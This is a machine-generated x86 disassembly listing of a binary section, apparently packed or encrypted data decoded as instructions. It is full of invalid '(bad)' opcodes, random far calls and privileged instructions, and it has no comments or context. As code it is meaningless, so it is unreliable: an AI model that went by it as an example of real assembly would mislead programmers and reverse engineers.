  42550c:	pop    esp
  42550d:	aad    0x20
  42550f:	cmp    al,0x2c
  425511:	jbe    0x4254cd
  425513:	fcomp  DWORD PTR [ebp+0x1a]
  425516:	or     ch,cl
  425518:	call   0xef2e:0xb724c01e
  42551f:	pop    edx
  425520:	inc    DWORD PTR [esi+esi*2]
  425523:	adc    eax,0x93881c97
  425528:	push   esi
  425529:	dec    ebx
  42552a:	inc    ecx
  42552b:	out    dx,eax
  42552c:	pop    ss
  42552d:	sub    BYTE PTR [esi+esi*8+0x1884a336],dh
  425534:	mov    esi,0x9efb9809
  425539:	xchg   edi,eax
  42553a:	xor    BYTE PTR [ecx-0x46],cl
  42553d:	(bad)  [ebx-0x246d260b]
  425543:	lds    esi,FWORD PTR [eax-0x117d01aa]
  425549:	std    
  42554a:	pop    es
  42554b:	xor    DWORD PTR [ebp+edi*1+0x4c2f087f],esp
  425552:	adc    BYTE PTR [edx],ah
  425554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425555:	hlt    
  425556:	inc    eax
  425557:	mov    eax,ds:0xcf500edb
  42555c:	push   0xffffffc5
  42555e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42555f:	inc    ecx
  425560:	out    0x10,eax
  425562:	lods   al,BYTE PTR ds:[esi]
  425563:	sldt   WORD PTR [eax]
	...
  42556e:	add    BYTE PTR [eax],al
  425570:	add    bl,ch
  425572:	dec    eax
  425573:	or     al,0xc7
  425575:	scas   eax,DWORD PTR es:[edi]
  425576:	(bad)  
  425577:	jmp    0x4255e5
  425579:	popa   
  42557a:	mov    cl,ch
  42557c:	or     edi,DWORD PTR [edx+ebx*4-0x338a4d7b]
  425583:	add    DWORD PTR [eax],eax
  425585:	stos   DWORD PTR es:[edi],eax
  425586:	add    eax,DWORD PTR [eax]
  425588:	add    BYTE PTR [ecx+0x1cfb15be],ah
  42558e:	mov    edx,edx
  425590:	xchg   esi,eax
  425591:	clc    
  425592:	imul   eax,DWORD PTR [ebp-0x43b9d213],0xdc74ff26
  42559c:	popa   
  42559d:	test   DWORD PTR [ebx-0x795303e6],esp
  4255a3:	pop    es
  4255a4:	(bad)  
  4255a6:	ffree  st(5)
  4255a8:	push   esi
  4255a9:	inc    eax
  4255aa:	inc    edx
  4255ab:	mov    al,0xd7
  4255ad:	call   0x486a:0xbf4eb31e
  4255b4:	cmp    al,0x25
  4255b6:	mov    ds:0x8ad838e0,eax
  4255bb:	xchg   BYTE PTR [eax-0x37],ah
  4255be:	cmp    DWORD PTR [edi+ebx*1],esp
  4255c1:	push   esi
  4255c2:	push   ebx
  4255c3:	or     eax,0x2f8603d0
  4255c8:	fidiv  DWORD PTR [esi]
  4255ca:	xchg   esi,eax
  4255cb:	dec    cl
  4255cd:	jnp    0x42557c
  4255cf:	inc    ebx
  4255d0:	inc    ebx
  4255d1:	imul   ebp,DWORD PTR [ecx+eax*2],0xffffffd5
  4255d5:	ins    DWORD PTR es:[edi],dx
  4255d6:	fwait
  4255d7:	retf   
  4255d8:	dec    esi
  4255d9:	lods   eax,DWORD PTR ds:[esi]
  4255da:	dec    ebp
  4255db:	fs dec edi
  4255dd:	jecxz  0x42555f
  4255df:	sti    
  4255e0:	sub    ebx,esi
  4255e2:	xchg   DWORD PTR [edx+0x4d],ecx
  4255e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255e6:	pushf  
  4255e7:	sahf   
  4255e8:	sbb    al,0xe9
  4255ea:	push   es
  4255eb:	push   0xb60ca52e
  4255f0:	mov    ch,0x85
  4255f2:	mov    WORD PTR [esi+0x32],cs
  4255f5:	jle    0x94bb7d97
  4255fb:	and    DWORD PTR [ebx-0x27d6ee47],ebx
  425601:	mov    ebp,edi
  425603:	fisubr DWORD PTR ds:0x322a5666
  425609:	ror    dl,cl
  42560b:	mov    edx,0x19cade37
  425610:	int3   
  425611:	adc    eax,0x8d2e4235
  425616:	test   DWORD PTR [edi+esi*8+0x48],esp
  42561a:	adc    cl,BYTE PTR [ecx+eax*8]
  42561d:	push   esi
  42561e:	sbb    ah,BYTE PTR [ecx+ecx*1]
  425621:	adc    BYTE PTR [eax-0x11c0b8],dh
  425627:	inc    BYTE PTR [edi+0x3d]
  42562a:	xchg   edx,eax
  42562b:	sbb    bh,bh
  42562d:	jmp    0x4256aa
  42562f:	cld    
  425630:	mov    al,0xff
  425632:	mov    WORD PTR [edi],cs
  425634:	stc    
  425635:	jae    0x42563b
  425637:	cmp    ebx,DWORD PTR [eax+0x4a]
  42563a:	add    eax,0xfa1221f3
  42563f:	push   esp
  425640:	add    al,0x4e
  425642:	inc    esp
  425643:	or     eax,0xd37f973e
  425648:	jo     0x425653
  42564a:	and    eax,0x7f95fe76
  42564f:	dec    esi
  425650:	fcomp  QWORD PTR [ebx-0x65946c3b]
  425656:	xlat   BYTE PTR ds:[ebx]
  425657:	js     0x4256b6
  425659:	retf   0x50cb
  42565c:	popa   
  42565d:	adc    eax,0x802b3fa1
  425662:	jae    0x4256ad
  425664:	imul   BYTE PTR [ecx]
  425666:	mov    WORD PTR [eax],?
  425668:	sub    BYTE PTR [edi],ah
  42566a:	stc    
  42566b:	or     eax,0x215b9c8b
  425670:	imul   edi,DWORD PTR [ebx],0xffffffab
  425673:	bound  esp,QWORD PTR [ecx-0x4a44a8f2]
  425679:	mov    ecx,0xee498d9
  42567e:	cmp    DWORD PTR ds:0xfe5e29ff,0xffffffc1
  425685:	push   ds
  425686:	out    0xaa,al
  425688:	pop    ebp
  425689:	jno    0x42567e
  42568b:	fnstcw WORD PTR [esi]
  42568d:	xchg   edx,eax
  42568e:	adc    DWORD PTR [ecx-0x171b12ae],edi
  425694:	sbb    eax,0xa667ccb
  425699:	xchg   edx,edx
  42569b:	jb     0x425719
  42569d:	sbb    DWORD PTR [esi-0x47],0x97102c76
  4256a4:	into   
  4256a5:	mov    ds:0x53086acc,al
  4256aa:	jnp    0x425679
  4256ac:	jge    0x425664
  4256ae:	ja     0x42566f
  4256b0:	xor    esi,0x5cc7287e
  4256b6:	jl     0x42564c
  4256b8:	push   edi
  4256b9:	out    0xfa,al
  4256bb:	mov    ecx,0x1a9fda2d
  4256c0:	test   BYTE PTR [edi+eiz*1-0x30],0x53
  4256c5:	stos   BYTE PTR es:[edi],al
  4256c6:	jno    0x42564e
  4256c8:	loope  0x42567d
  4256ca:	sub    al,BYTE PTR [eax+0x66]
  4256cd:	dec    esi
  4256ce:	dec    eax
  4256cf:	xor    al,0x61
  4256d1:	daa    
  4256d2:	cld    
  4256d3:	stos   DWORD PTR es:[edi],eax
  4256d4:	sub    al,0x9d
  4256d6:	pop    eax
  4256d7:	xchg   ebx,eax
  4256d8:	xor    DWORD PTR [esi+eax*4],0xbed42aca
  4256df:	fs mov ch,0xc
  4256e2:	neg    DWORD PTR [ebx+0x1e]
  4256e5:	fistp  QWORD PTR [esi-0xc6480bc]
  4256eb:	mov    ds:0xf5ec03f5,al
  4256f0:	outs   dx,BYTE PTR ds:[esi]
  4256f1:	scas   eax,DWORD PTR es:[edi]
  4256f2:	inc    ebx
  4256f3:	rcl    BYTE PTR [ebp+0x262b9107],1
  4256f9:	jle    0x4256fd
  4256fb:	icebp  
  4256fc:	jg     0x4256c4
  4256fe:	mul    DWORD PTR [ebx-0x3d]
  425701:	mov    WORD PTR [edx+0x51],?
  425704:	fistp  WORD PTR [edx]
  425706:	(bad)  
  425707:	shl    bl,1
  425709:	rcr    BYTE PTR [eax],cl
  42570b:	aaa    
  42570c:	jecxz  0x42573c
  42570e:	je     0x42570d
  425710:	and    al,0x4b
  425712:	xor    al,0x33
  425714:	sbb    eax,0x4a9da613
  425719:	jbe    0x425728
  42571b:	clc    
  42571c:	jle    0x4256c9
  42571e:	add    eax,0xcb460ff5
  425723:	fwait
  425724:	and    al,0x98
  425726:	inc    eax
  425727:	jle    0x198d2ad0
  42572d:	dec    edx
  42572e:	aam    0x2b
  425730:	stos   DWORD PTR es:[edi],eax
  425731:	hlt    
  425732:	push   cs
  425733:	cwde   
  425734:	xlat   BYTE PTR ds:[ebx]
  425735:	cli    
  425736:	in     al,dx
  425737:	cs jns 0x4256d6
  42573a:	fidivr DWORD PTR [eax]
  42573c:	xlat   BYTE PTR ds:[ebx]
  42573d:	inc    DWORD PTR [eax+0x70f940a]
  425743:	xchg   edx,eax
  425744:	mov    al,ds:0xe5bbd505
  425749:	pop    ebx
  42574a:	xchg   ecx,ecx
  42574c:	mov    dh,0x49
  42574e:	push   edx
  42574f:	es ds mov eax,eax
  425753:	jo     0x425748
  425755:	pushf  
  425756:	std    
  425757:	mov    ecx,0x94845b15
  42575c:	push   ebx
  42575d:	pop    es
  42575e:	inc    ebp
  42575f:	(bad)  
  425760:	(bad)  
  425761:	jno    0x42570b
  425763:	inc    edx
  425764:	push   edx
  425765:	(bad)  
  425766:	out    dx,eax
  425767:	pushf  
  425768:	pavgb  mm3,QWORD PTR [ecx+0x102c694f]
  42576f:	cmp    BYTE PTR [edi-0x4740e8d2],bl
  425775:	jecxz  0x425746
  425777:	mov    BYTE PTR [ecx+0x6e],bh
  42577a:	push   ebp
  42577b:	inc    esp
  42577c:	sub    al,0x5e
  42577e:	fwait
  42577f:	and    al,0xfe
  425781:	cmp    BYTE PTR [eax],dh
  425783:	mov    eax,0xc7b2bb69
  425788:	imul   ebx,DWORD PTR [edx],0x4c
  42578b:	mov    ds:0xc240a7dc,eax
  425790:	rcl    DWORD PTR [ebx+edx*8+0x50],0x78
  425795:	outs   dx,DWORD PTR ds:[esi]
  425796:	sbb    DWORD PTR [ebx],esp
  425798:	nop
  425799:	ds dec esi
  42579b:	and    dl,BYTE PTR [eax+0x23]
  42579e:	fsubr  DWORD PTR [eax-0x47bf392d]
  4257a4:	stos   DWORD PTR es:[edi],eax
  4257a5:	xchg   ebx,eax
  4257a6:	and    ah,dl
  4257a8:	adc    DWORD PTR [ecx-0x28d70f29],esi
  4257ae:	clc    
  4257af:	mov    ch,0x83
  4257b1:	dec    edx
  4257b2:	inc    esi
  4257b3:	sar    DWORD PTR [ebx-0x96ccdd3],cl
  4257b9:	repnz pop ecx
  4257bb:	or     al,0x52
  4257bd:	inc    esi
  4257be:	aaa    
  4257bf:	rdmsr  
  4257c1:	dec    ecx
  4257c2:	arpl   si,di
  4257c4:	repz ret 0x1a0f
  4257c8:	dec    esi
  4257c9:	jno    0x425760
  4257cb:	clc    
  4257cc:	fisttp QWORD PTR [ebx-0x6421d6c3]
  4257d2:	retf   
  4257d3:	xor    al,0x3c
  4257d5:	gs inc ebp
  4257d7:	icebp  
  4257d8:	cld    
  4257d9:	pop    ebp
  4257da:	outs   dx,BYTE PTR ds:[esi]
  4257db:	and    dh,0xb5
  4257de:	or     esp,DWORD PTR [ecx]
  4257e0:	ds cld 
  4257e2:	push   edx
  4257e3:	call   0xe005:0xf51c076b
  4257ea:	test   BYTE PTR [edi+0x10fd821c],bl
  4257f0:	mov    BYTE PTR [esi-0x72],dh
  4257f3:	adc    edi,eax
  4257f5:	lahf   
  4257f6:	jmp    0xc909:0xa2bde20
  4257fd:	mov    ebx,eax
  4257ff:	inc    edi
  425800:	and    si,WORD PTR ds:0xc5791a48
  425807:	(bad)
  42580a:	sbb    eax,0x35f960c7
  42580f:	jb     0x42582a
  425811:	mov    bh,0x92
  425813:	faddp  st(2),st
  425815:	or     edi,DWORD PTR [esi+0x2419e6e6]
  42581b:	shl    BYTE PTR [eax],0x73
  42581e:	pop    esp
  42581f:	inc    ebp
  425820:	rsm    
  425822:	adc    BYTE PTR [edi],0x81
  425825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425826:	jne    0x4257ce
  425828:	mov    ah,0x5e
  42582a:	cmp    edx,DWORD PTR [eax]
  42582c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42582d:	jp     0x42587e
  42582f:	inc    ebx
  425830:	fstp   DWORD PTR [edx]
  425832:	inc    ebp
  425833:	push   edx
  425834:	test   al,0x82
  425836:	mov    al,BYTE PTR [esi-0x5f]
  425839:	hlt    
  42583a:	rcr    DWORD PTR fs:[edi-0x6bda164f],0xfb
  425842:	hlt    
  425843:	arpl   WORD PTR [edi-0x43108a7a],dx
  425849:	and    eax,0x30a75d96
  42584e:	je     0x4257ec
  425850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425851:	mov    eax,ds:0xff7e8e1f
  425856:	out    dx,al
  425857:	out    0xb8,eax
  425859:	sar    ebp,1
  42585b:	(bad)  
  42585c:	ror    DWORD PTR [edi-0x3ee81cf3],cl
  425862:	dec    ecx
  425863:	and    esi,DWORD PTR [esi-0xbf66e99]
  425869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42586a:	sub    DWORD PTR [eax-0x590032e3],edi
  425870:	or     bh,BYTE PTR [ebx]
  425872:	shr    DWORD PTR [ecx-0x34],1
  425875:	mov    eax,0xaa5c7705
  42587a:	inc    esi
  42587b:	enter  0xdcdc,0x35
  42587f:	pop    ecx
  425880:	imul   ecx,edx,0x72
  425883:	adc    ah,BYTE PTR [ebx+0x8271162]
  425889:	icebp  
  42588a:	ret    0xd2ea
  42588d:	in     eax,0xff
  42588f:	adc    ebp,DWORD PTR [ecx+0x3d]
  425892:	out    0xea,eax
  425894:	add    bh,bl
  425896:	jno    0x4258f7
  425898:	push   0x2cdf4790
  42589d:	jg     0x425846
  42589f:	stos   DWORD PTR es:[edi],eax
  4258a0:	xchg   ah,dl
  4258a2:	pop    ss
  4258a3:	jo     0x425863
  4258a5:	out    dx,eax
  4258a6:	jne    0x4258be
  4258a8:	retf   
  4258a9:	sti    
  4258aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258ab:	mov    ecx,DWORD PTR [esi+0x23c3f4c3]
  4258b1:	call   0x594f:0x9f49dcae
  4258b8:	ret    
  4258b9:	loope  0x42592b
  4258bb:	(bad)  
  4258bc:	mov    cl,0x4
  4258be:	inc    ebp
  4258bf:	lock popa 
  4258c1:	sbb    ecx,DWORD PTR [ebx]
  4258c3:	(bad)  
  4258c5:	cmp    BYTE PTR [esi-0x1f],bl
  4258c8:	and    BYTE PTR [edx+0xc1ded83],bh
  4258ce:	and    eax,0xac84efb1
  4258d3:	jae    0x4258e5
  4258d5:	pop    ss
  4258d6:	test   ecx,edx
  4258d8:	js     0x4258c6
  4258da:	inc    edi
  4258db:	ins    BYTE PTR es:[edi],dx
  4258dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258dd:	cmc    
  4258de:	mov    DWORD PTR [eax],0x57e05706
  4258e4:	daa    
  4258e5:	dec    ebx
  4258e6:	cmp    eax,ecx
  4258e8:	sub    al,0xde
  4258ea:	mov    cl,0xc7
  4258ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258ed:	cmp    DWORD PTR [edi-0x3a0855a0],0x51d21cf3
  4258f7:	add    ebx,ecx
  4258f9:	xor    al,ah
  4258fb:	push   ebp
  4258fc:	lea    edi,[ebx]
  4258fe:	and    al,0x92
  425900:	or     al,0x34
  425902:	cdq    
  425903:	sti    
  425904:	cmp    dh,BYTE PTR [eax+0x28]
  425907:	les    esp,FWORD PTR [esi-0x35]
  42590a:	es enter 0x785b,0x9d
  42590f:	jmp    0x9c16:0x89aad4ea
  425916:	mov    al,0xb8
  425918:	fisub  WORD PTR [edi]
  42591a:	fst    QWORD PTR [ecx-0x6]
  42591d:	dec    ebp
  42591e:	mov    bh,0x72
  425920:	fistp  WORD PTR [esp+esi*1+0x1273d06b]
  425927:	mov    BYTE PTR [ebp+0x25],bh
  42592a:	add    esp,esi
  42592c:	dec    ebp
  42592d:	sar    BYTE PTR [edi],0x8e
  425930:	sub    esp,esi
  425932:	nop
  425933:	jns    0x425935
	...
  425941:	in     al,dx
  425942:	test   BYTE PTR [eax-0x5f],ah
  425945:	push   0xedcdede5
  42594a:	cld    
  42594b:	mov    BYTE PTR [ebx+0x4620bc3b],ah
  425951:	and    al,dl
  425953:	add    DWORD PTR [eax],eax
  425955:	stos   DWORD PTR es:[edi],eax
  425956:	add    eax,DWORD PTR [eax]
  425958:	add    BYTE PTR [edi],al
  42595a:	ins    DWORD PTR es:[edi],dx
  42595b:	jmp    0x4259a5
  42595d:	push   esi
  42595e:	fcmovu st,st(6)
  425960:	loopne 0x425907
  425962:	sbb    DWORD PTR [edx+0x4c0023be],eax
  425968:	sub    DWORD PTR [edi+0x5e84a92f],0xffffff8b
  42596f:	mov    esi,0x15889d2
  425974:	mov    bh,0x2
  425976:	xchg   edx,eax
  425977:	repnz iret 
  425979:	fdivr  DWORD PTR [eax+0x48c57aa6]
  42597f:	sbb    al,ch
  425981:	xchg   ebx,eax
  425982:	loop   0x4259a5
  425984:	mov    WORD PTR [ebx-0x6f786d46],ss
  42598a:	mov    ch,0x77
  42598c:	mov    bl,0xb
  42598e:	sbb    ecx,ebx
  425990:	sar    BYTE PTR [eax-0x766bb28c],cl
  425996:	js     0x425938
  425998:	imul   edi,DWORD PTR [eax+edi*1-0x7],0xacc75f33
  4259a0:	rcr    DWORD PTR [ecx-0x3],0x4a
  4259a4:	push   edi
  4259a5:	nop
  4259a6:	aam    0x4c
  4259a8:	mov    BYTE PTR [ebp-0x4],al
  4259ab:	xchg   ebp,eax
  4259ac:	mov    esi,0x2f1fec54
  4259b1:	mov    ecx,0xfaf2ffa7
  4259b6:	js     0x42594c
  4259b8:	add    bh,BYTE PTR [eax]
  4259ba:	sub    BYTE PTR [esp+eiz*8],ah
  4259bd:	jnp    0x42595b
  4259bf:	pop    ss
  4259c0:	(bad)  
  4259c1:	retf   
  4259c2:	jecxz  0x4259c4
  4259c4:	or     ebp,esp
  4259c6:	(bad)  
  4259c7:	in     eax,dx
  4259c8:	daa    
  4259c9:	test   DWORD PTR [ecx+0x8cc98ca],0x78fdf936
  4259d3:	dec    edi
  4259d4:	mov    ds:0x3147282,al
  4259d9:	push   es
  4259da:	bound  esi,QWORD PTR [eax]
  4259dc:	push   esi
  4259dd:	cmp    DWORD PTR [ebx-0x73b603a4],edx
  4259e3:	add    eax,0x19524b9
  4259e8:	scas   eax,DWORD PTR es:[edi]
  4259e9:	imul   ebp,esi,0x9b97ebb
  4259ef:	and    esi,0xfffffffe
  4259f2:	xchg   ecx,eax
  4259f3:	enter  0xfeb0,0x7e
  4259f7:	mov    cl,0x93
  4259f9:	mov    dh,0x58
  4259fb:	cdq    
  4259fc:	sar    eax,cl
  4259fe:	cs fwait
  425a00:	pop    ss
  425a01:	cld    
  425a02:	push   esp
  425a03:	into   
  425a04:	std    
  425a05:	jbe    0x4259f4
  425a07:	jg     0x425996
  425a09:	sahf   
  425a0a:	mov    eax,ds:0xf16b3ba4
  425a0f:	mov    BYTE PTR [ebp+0x3e],dh
  425a12:	scas   eax,DWORD PTR es:[edi]
  425a13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a14:	mov    ss,WORD PTR [ecx]
  425a16:	(bad)  
  425a17:	mov    WORD PTR [ebp+ebp*8+0x3c],cs
  425a1b:	bndldx (bad),ds:0x1cf5cace
  425a22:	(bad)  
  425a23:	fimul  DWORD PTR [edx-0x4]
  425a26:	jmp    0xa341:0xd20d17bb
  425a2d:	enter  0x5f8d,0x50
  425a31:	(bad)  [ebp-0x44]
  425a34:	add    edx,edi
  425a36:	cmp    ebx,DWORD PTR [ebx+0x72ecc14c]
  425a3c:	xor    ebp,DWORD PTR [ecx-0x13]
  425a3f:	sub    BYTE PTR [edi],0x14
  425a42:	fisubr DWORD PTR [edx+0x7f]
  425a45:	add    bl,BYTE PTR [esi-0x68]
  425a48:	in     eax,dx
  425a49:	lea    ebp,ds:[esi+eax*4]
  425a4d:	mov    dl,0x39
  425a4f:	daa    
  425a50:	or     eax,ecx
  425a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a53:	retf   
  425a54:	pushf  
  425a55:	(bad)  
  425a56:	es fdivr st,st(7)
  425a59:	or     BYTE PTR [ecx],cl
  425a5b:	or     eax,0x3150792
  425a60:	dec    esp
  425a61:	arpl   di,bx
  425a63:	and    bh,bl
  425a65:	adc    eax,0x3c566f83
  425a6a:	cmp    esi,ebp
  425a6c:	int    0x63
  425a6e:	leave  
  425a6f:	daa    
  425a70:	mov    cl,0xed
  425a72:	ins    BYTE PTR es:[edi],dx
  425a73:	push   esi
  425a74:	call   0x8085:0x3244680e
  425a7b:	dec    ebx
  425a7c:	outs   dx,BYTE PTR ds:[esi]
  425a7d:	mov    al,ds:0xde8227cc
  425a82:	mov    eax,ds:0xa52b7a1a
  425a87:	rcl    BYTE PTR [edi],1
  425a89:	stc    
  425a8a:	in     al,0x1d
  425a8c:	enter  0xf7d3,0x8
  425a90:	and    BYTE PTR [edi],ah
  425a92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a93:	mov    bl,0xc4
  425a95:	xchg   BYTE PTR [edi-0x4853a8c5],ah
  425a9b:	sub    eax,0xbb1ead0a
  425aa0:	in     al,dx
  425aa1:	inc    esi
  425aa2:	dec    ebx
  425aa3:	adc    bh,ch
  425aa5:	cmp    eax,0xa48d1658
  425aaa:	xchg   ebp,eax
  425aab:	add    eax,0x1e914afc
  425ab0:	inc    esi
  425ab1:	pop    edx
  425ab2:	mov    eax,0x147cd9ff
  425ab7:	retf   
  425ab8:	dec    ecx
  425ab9:	and    eax,0xae08ae82
  425abe:	mov    WORD PTR [esi-0x6141716c],gs
  425ac4:	fnsave [esi]
  425ac6:	ret    0x4f6f
  425ac9:	dec    esi
  425aca:	in     eax,0x90
  425acc:	sahf   
  425acd:	push   ebp
  425ace:	or     DWORD PTR [ebx-0x6eb0e540],ecx
  425ad4:	cld    
  425ad5:	in     eax,0x72
  425ad7:	or     eax,0x74e301d3
  425adc:	mov    dh,0x6e
  425ade:	pop    eax
  425adf:	add    BYTE PTR [esi+0x4],dl
  425ae2:	jmp    0x29a56a4
  425ae7:	inc    ebp
  425ae8:	test   BYTE PTR [ebp-0x20cc4487],cl
  425aee:	cmp    bh,bl
  425af0:	jo     0x425a75
  425af2:	out    0xdd,al
  425af4:	add    BYTE PTR [ecx-0x45],cl
  425af7:	stos   DWORD PTR es:[edi],eax
  425af8:	fwait
  425af9:	push   edx
  425afa:	add    eax,0x9572ce4e
  425aff:	daa    
  425b00:	inc    ebp
  425b01:	pop    esp
  425b02:	push   esp
  425b03:	fwait
  425b04:	les    esi,FWORD PTR [eax-0xe351a42]
  425b0a:	jae    0x425aea
  425b0c:	cmc    
  425b0d:	push   ebx
  425b0e:	in     eax,dx
  425b0f:	les    esp,FWORD PTR [esi]
  425b11:	stc    
  425b12:	or     ebp,DWORD PTR [ebx+0x653db5fa]
  425b18:	dec    esp
  425b19:	in     eax,dx
  425b1a:	inc    edx
  425b1b:	mov    BYTE PTR [ebx+0x50],0x93
  425b1f:	cmp    al,0x13
  425b21:	popa   
  425b22:	mov    bl,BYTE PTR [ebx+0x49]
  425b25:	ins    BYTE PTR es:[edi],dx
  425b26:	hlt    
  425b27:	xor    ecx,ebx
  425b29:	mov    ah,0x4e
  425b2b:	dec    edi
  425b2c:	sbb    eax,0x39ec7727
  425b31:	stc    
  425b32:	repz arpl WORD PTR [ebx+eiz*8-0x6a90bd64],cx
  425b3a:	mov    cl,0xa9
  425b3c:	jmp    0x15badf2
  425b41:	mov    dl,0x6a
  425b43:	jecxz  0x425b67
  425b45:	pop    ecx
  425b46:	or     al,BYTE PTR [edi-0x41]
  425b49:	and    eax,0xcc64771f
  425b4e:	pop    ebp
  425b4f:	loop   0x425b10
  425b51:	sbb    BYTE PTR [esi-0x1b],ch
  425b54:	lods   al,BYTE PTR ds:[esi]
  425b55:	stos   BYTE PTR es:[edi],al
  425b56:	mov    ebp,0x930e8a0e
  425b5b:	stos   DWORD PTR es:[edi],eax
  425b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b5d:	push   ebx
  425b5e:	test   BYTE PTR [ebp-0x2c],ch
  425b61:	popa   
  425b62:	jle    0x425bd4
  425b64:	jle    0x425bbd
  425b66:	gs sub eax,0x5485bd02
  425b6c:	mov    esp,0xb7a44bd8
  425b71:	cmp    ch,dl
  425b73:	stos   DWORD PTR es:[edi],eax
  425b74:	mov    dl,0x65
  425b76:	inc    ebx
  425b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b78:	xlat   BYTE PTR ds:[ebx]
  425b79:	fisubr WORD PTR [eax]
  425b7b:	rcl    DWORD PTR [esi],cl
  425b7d:	push   ebp
  425b7e:	jns    0x425b09
  425b80:	cmp    bh,BYTE PTR fs:0xffa40b91
  425b87:	sar    BYTE PTR [esi],cl
  425b89:	or     eax,0xb1a1276
  425b8e:	fldcw  WORD PTR [ebx]
  425b90:	aad    0xad
  425b92:	sahf   
  425b93:	mov    cl,0x53
  425b95:	jnp    0x425b2d
  425b97:	mov    ebx,esp
  425b99:	mov    DWORD PTR [ebp+eiz*4-0x5b619b12],edi
  425ba0:	loopne 0x425bec
  425ba2:	retf   0xf203
  425ba5:	gs dec edx
  425ba7:	push   es
  425ba8:	stos   BYTE PTR es:[edi],al
  425ba9:	push   ecx
  425baa:	aaa    
  425bab:	inc    edi
  425bac:	push   ds
  425bad:	mov    eax,ds:0xbd1114d2
  425bb2:	mov    bh,0xfa
  425bb4:	stc    
  425bb5:	sub    ah,BYTE PTR [ebx-0x4849f37d]
  425bbb:	fild   WORD PTR [eax-0x59]
  425bbe:	fcom   st(6)
  425bc0:	cmp    al,0xc
  425bc2:	mov    esi,0xcbf56ba4
  425bc7:	pop    sp
  425bc9:	call   0xf139:0xa323be76
  425bd0:	test   al,0x8e
  425bd2:	xor    bh,BYTE PTR [esi]
  425bd4:	cmc    
  425bd5:	cmp    ecx,DWORD PTR [ecx-0x15d19edd]
  425bdb:	cmc    
  425bdc:	adc    eax,0x6184915
  425be1:	push   0x6ca84ee7
  425be6:	inc    ebp
  425be7:	jg     0x425c06
  425be9:	mov    ebp,0x8bead819
  425bee:	sbb    BYTE PTR [ebp+0x3c14e191],0xc9
  425bf5:	ret    
  425bf6:	and    eax,0xca6d4e82
  425bfb:	clc    
  425bfc:	aas    
  425bfd:	lock or ecx,DWORD PTR [esi-0x7e]
  425c01:	pop    edi
  425c02:	sbb    esi,edi
  425c04:	imul   ebp,DWORD PTR [ebx],0x3e47b6f8
  425c0a:	popf   
  425c0b:	or     esp,DWORD PTR [esi-0x4f]
  425c0e:	xor    esp,esp
  425c10:	cmp    eax,edi
  425c12:	push   edi
  425c13:	popf   
  425c14:	aaa    
  425c15:	adc    al,0xd5
  425c17:	fwait
  425c18:	push   eax
  425c19:	or     BYTE PTR [ebp-0x918585],cl
  425c1f:	xchg   ecx,eax
  425c20:	xor    edi,DWORD PTR [edx+0x65]
  425c23:	ins    DWORD PTR es:[edi],dx
  425c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c25:	jg     0x425c64
  425c27:	aam    0x68
  425c29:	popf   
  425c2a:	and    al,0xf2
  425c2c:	in     al,dx
  425c2d:	sahf   
  425c2e:	xchg   ebx,eax
  425c2f:	rcr    BYTE PTR [esi],0xcb
  425c32:	jmp    0xf1cd:0xb62fc9b8
  425c39:	int    0xeb
  425c3b:	and    ebp,esp
  425c3d:	mov    edx,0xee1fa4d9
  425c42:	and    ch,dh
  425c44:	addr16 ret 
  425c46:	sub    ebx,DWORD PTR [edi-0x52]
  425c49:	(bad)  
  425c4a:	mov    esi,0x442c1b6f
  425c4f:	stc    
  425c50:	jns    0x425c60
  425c52:	cmc    
  425c53:	mov    al,ds:0xcb1b8cef
  425c58:	mov    ecx,0xa8fbaabc
  425c5d:	call   0xa0a08bcd
  425c62:	dec    eax
  425c63:	jecxz  0x425c27
  425c65:	mov    eax,DWORD PTR [ecx]
  425c67:	int    0xa3
  425c69:	cmp    BYTE PTR [ebx+0x36cf4eab],dl
  425c6f:	dec    eax
  425c70:	std    
  425c71:	in     al,dx
  425c72:	mov    edi,0xf7e1708f
  425c77:	(bad)  
  425c78:	lock test ch,0x29
  425c7c:	stc    
  425c7d:	sbb    bh,cl
  425c7f:	xchg   ebp,eax
  425c80:	out    dx,eax
  425c81:	adc    DWORD PTR [eax-0x13a7f719],ebp
  425c87:	fcomp  DWORD PTR [eax+esi*1]
  425c8a:	and    eax,0xcacb56a0
  425c8f:	fdiv   DWORD PTR [ebx+0x79]
  425c92:	je     0x425c3e
  425c94:	xor    BYTE PTR [edx+0x462af4c7],bl
  425c9a:	push   0x62
  425c9c:	push   ss
  425c9d:	inc    edi
  425c9e:	pushf  
  425c9f:	mov    BYTE PTR [edi+eiz*8-0x769fbda2],dh
  425ca6:	cmp    al,0xce
  425ca8:	test   BYTE PTR [eax+eax*1],cl
  425cab:	push   edx
  425cac:	pushf  
  425cad:	mov    dl,0xeb
  425caf:	(bad)  
  425cb0:	cwde   
  425cb1:	mov    ebx,0xc329ed9f
  425cb6:	lods   eax,DWORD PTR ds:[esi]
  425cb7:	arpl   WORD PTR [edx+esi*4-0x13bff03d],bx
  425cbe:	push   ds
  425cbf:	adc    al,0x4e
  425cc1:	xor    bl,BYTE PTR ds:0x29477b0c
  425cc7:	cmp    esi,0x9588e8e2
  425ccd:	test   al,0x8e
  425ccf:	pop    esi
  425cd0:	lods   al,BYTE PTR ds:[esi]
  425cd1:	adc    edx,DWORD PTR [edi-0x525dca0c]
  425cd7:	inc    edi
  425cd8:	push   edi
  425cd9:	mov    BYTE PTR [edi+0x19],cl
  425cdc:	mov    bh,0xc9
  425cde:	addr16 daa 
  425ce0:	mov    bl,BYTE PTR [edi-0x7e6cdda3]
  425ce6:	push   edi
  425ce7:	adc    al,BYTE PTR [ebx]
